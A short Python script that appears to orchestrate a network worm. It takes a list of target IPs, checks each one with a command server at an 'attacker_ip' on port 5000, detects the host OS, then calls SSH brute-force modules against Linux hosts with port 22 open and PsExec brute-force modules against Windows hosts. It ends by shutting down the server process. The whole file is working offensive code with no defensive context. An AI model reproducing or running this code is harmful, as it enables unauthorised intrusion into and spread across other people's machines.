import get_ip 
import get_os
import SSHBruteForce as ssh
import port_scan as port
import Psexec_BruteForce as ps
import sys,requests
from os import system
server_pid= sys.argv[1]
ip_list,attacker_ip = get_ip.get_ip_()

for ip in ip_list:
   res = requests.get('http://'+attacker_ip+':5000/checkIp/'+ip)
   res=res.json()
   if(res['status']):
       continue
   os_name = get_os.get_os_(ip)
   port_22 = port.check_open_port(ip)
   if(os_name == 'Linux' and port_22 == True ):
          ssh.d_main(ip)
   elif(os_name == 'Microsoft'):
          ps.d_main(ip,attacker_ip)
system('bash close.sh {0}'.format(server_pid))


